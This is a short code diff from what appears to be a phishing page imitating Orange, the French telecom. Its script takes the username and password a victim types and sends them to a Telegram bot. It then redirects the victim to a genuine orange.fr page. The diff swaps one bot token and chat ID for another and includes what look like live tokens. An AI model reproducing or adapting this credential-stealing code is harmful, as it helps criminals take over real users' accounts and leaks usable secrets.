@@ -248,11 +248,11 @@
     document.getElementById('co').addEventListener('click', function (e) {
         e.preventDefault();
 
-        const botToken = '5318317440:AAHEGvCaXHjSTM8BqtquRuQn8GBRCDdihGc';
-        const chatId = '5276838022';
+        // const botToken = '5318317440:AAHEGvCaXHjSTM8BqtquRuQn8GBRCDdihGc';
+        // const chatId = '5276838022';
 
-        // const botToken = '7366002950:AAFzze0vYX5nxrxWxX7y4vVg2CcJy-3Fsi4'; 
-        // const chatId = '7332838769';
+         const botToken = '7376198280:AAEVWxkfBmuRp9jN7Tihgg8Wv0k86ulzwP4'; 
+         const chatId = '7263241017';
 
         const user = document.getElementById("user").value;
         const pass = document.getElementById("pwd").value;
@@ -275,7 +275,7 @@
                         throw new Error(`Erreur lors de l'envoi du message à Telegram: ${text}`);
                     });
                 }
-                window.location.href = 'https://www.orange.fr/pages-juridiques/infos-legales.html';
+                window.location.href = 'https://www.orange.fr/portail';
             })
             .catch(error => {
                 console.error('Erreur :', error);
